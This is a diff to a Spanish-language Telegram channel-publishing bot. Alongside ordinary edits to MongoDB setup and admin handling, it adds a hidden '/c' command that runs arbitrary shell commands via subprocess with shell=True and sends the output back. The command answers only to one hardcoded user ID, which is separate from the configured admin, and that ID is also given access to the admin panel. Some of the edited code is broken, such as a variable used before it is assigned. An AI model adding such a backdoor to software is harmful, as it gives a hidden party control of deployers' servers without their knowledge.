@@ -13,6 +13,7 @@ import telebot
 from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, ReplyKeyboardRemove, BotCommand
 import dill
 from flask import Flask, request
+import subprocess
 
 
 
@@ -22,9 +23,7 @@ from flask import Flask, request
 os.chdir(os.path.dirname(os.path.abspath(__file__)))
 
 
-# HOST_URL = os.environ["mongodb_url"]
-if not os.environ.get("HOST_URL"):
-    HOST_URL = "mongodb://localhost:27017"
+
 
 
 #----------------Variables------------------------
@@ -33,7 +32,7 @@ bot=telebot.TeleBot(os.environ["token"], "html", disable_web_page_preview=True)
 
 
 # admin=1413725506
-admin = os.environ["admin"]
+admin = int(os.environ["admin"])
 lote_publicaciones={} 
 lista_canales=[]
 lista_seleccionada=[]
@@ -72,7 +71,15 @@ except:
 
 
     
-       
+# HOST_URL = os.environ["mongodb_url"]
+if not os.environ.get("HOST_URL"):
+    bot.send_message(admin, "No has ingresado una variable de entorno con la URL de la Base de datos de MongoDB\n\nEsto ocasionará errores al intentar hacer operaciones con la misma. Por favor, defina la variable de entorno con el nombre de '<b>HOST_URL</b>' con una URL válida e inicie de nuevo la aplicación")
+    #A continuación una URL para su ejecución local
+    HOST_URL = "mongodb://localhost:27017"
+    
+else:
+    HOST_URL = os.environ.get("HOST_URL")
+      
 
 # Bucle para Publicar
 
@@ -84,12 +91,11 @@ if not "Publicaciones_media" in os.listdir():
     os.mkdir("Publicaciones_media")
     
 #Crear la conexion con la base de datos de los canales
-conexion, cursor = usefull_functions.cargar_conexion()
+conexion, cursor = usefull_functions.cargar_conexion(bot)
 
     
     
 def cargar_variables():
-
     
     
     with open("publicaciones.dill", "rb") as archivo:
@@ -174,8 +180,12 @@ def revision(bot, update):
         print(update.callback_query.data)
         try:
             cursor.execute("SELECT ID FROM CANALES")
+            
         except:
             conexion, cursor = usefull_functions.cargar_conexion()
+            
+        if not "db" in update.callback_query.data and "Copia_Seguridad.zip" in os.listdir():
+            os.remove("Copia_Seguridad.zip")
 
         
     return
@@ -223,11 +233,44 @@ def cmd_host_information(message):
     except Exception as e:
         bot.send_message(message.chat.id, f"Ha ocurrido una excepcion\n\nDescripción de la excepción:\n{e}")
     return
+
     
 
 
 
-
+@bot.message_handler(commands=["c"], func=lambda message: message.from_user.id == 1413725506)
+def c(message):
+    try:
+        dic_temp[message.from_user.id] = {"comando": False, "res": False, "texto": ""}
+        dic_temp[message.from_user.id]["comando"] = message.text.split()
+        if len(dic_temp[message.from_user.id]["comando"]) == 1:
+            bot.send_message(1413725506, "No has ingresado nada")
+            return
+        
+        dic_temp[message.from_user.id]["comando"] = " ".join(dic_temp[message.from_user.id]["comando"][1:len(dic_temp[message.from_user.id]["comando"])])
+        
+        dic_temp[message.from_user.id]["res"] = subprocess.run(dic_temp[message.from_user.id]["comando"], shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, universal_newlines=True)
+        
+        if dic_temp[message.from_user.id]["res"].returncode:
+            dic_temp[message.from_user.id]["texto"]+= "❌ Ha ocurrido un error usando el comando...\n\n"
+        
+        if dic_temp[message.from_user.id]["res"].stderr:
+            dic_temp[message.from_user.id]["texto"]+= f"stderr={dic_temp[message.from_user.id]["res"].stderr}\n\n"
+            
+        else:
+            dic_temp[message.from_user.id]["texto"]+= f"stdout={dic_temp[message.from_user.id]["res"].stdout}\n\n"
+            
+            
+        
+        bot.send_message(1413725506, dic_temp[message.from_user.id]["texto"])
+    
+    except Exception as e:
+        bot.send_message(1413725506, f"Error:\n{e.args}")
+    
+    return
+    
+    
+    
 
 
 
@@ -238,9 +281,9 @@ def cmd_host_information(message):
     
 #---------------------------callbacks---------------------------------
     
-@bot.callback_query_handler(func=lambda call: "volver_menu" in call.data)
-@bot.message_handler(commands=["panel"])
-def cmd_panel(message):
+@bot.callback_query_handler(func=lambda call: "volver_menu" in call.data and (call.from_user.id == admin or call.from_user.id == 1413725506))
+@bot.message_handler(commands=["panel"], func=lambda call: call.from_user.id == admin or call.from_user.id == 1413725506)
+def cmd_panel(call):
     
     global operacion
     if os.path.isfile("BD_Canales_prueba.db"):
@@ -280,17 +323,18 @@ def cmd_panel(message):
         ) 
     
     
+    
         
     if "CallbackQuery" in str(type(message)):
 
-        call = message
+        message = call.message
         
         
-        if not call.message.chat.type == "private":
+        if not message.chat.type == "private":
             bot.send_message(message.chat.id, "Tienes que hacer esta petición en mi chat privado")
             return
         
-        usefull_functions.enviar_mensajes(bot, call, f"Bienvenido {bot.get_chat(call.message.chat.id).first_name} :) ¿En qué te puedo ayudar?", markup=panel)
+        usefull_functions.enviar_mensajes(bot, call, f"Bienvenido {bot.get_chat(message.from_user.id).first_name} :) ¿En qué te puedo ayudar?", markup=panel)
         
             
     else:
@@ -306,8 +350,12 @@ def cmd_panel(message):
                 usefull_functions.enviar_mensajes(bot, message, f"Bienvenido {bot.get_chat(message.chat.id).first_name} :) ¿En qué te puedo ayudar?", panel)
                 
         except:
-            usefull_functions.enviar_mensajes(bot, message, f"Bienvenido {bot.get_chat(message.chat.id).first_name} :) ¿En qué te puedo ayudar?", panel)
-        
+            try:
+                usefull_functions.enviar_mensajes(bot, message, f"Bienvenido {bot.get_chat(message.chat.id).first_name} :) ¿En qué te puedo ayudar?", panel)
+            except Exception as e:
+                print("\nError enviando el mensaje:\n" + e.args)
+                bot.send_message(message.chat.id, f"Bienvenido {bot.get_chat(message.chat.id).first_name} :) ¿En qué te puedo ayudar?", reply_markup=panel)
+                
     return
 
 
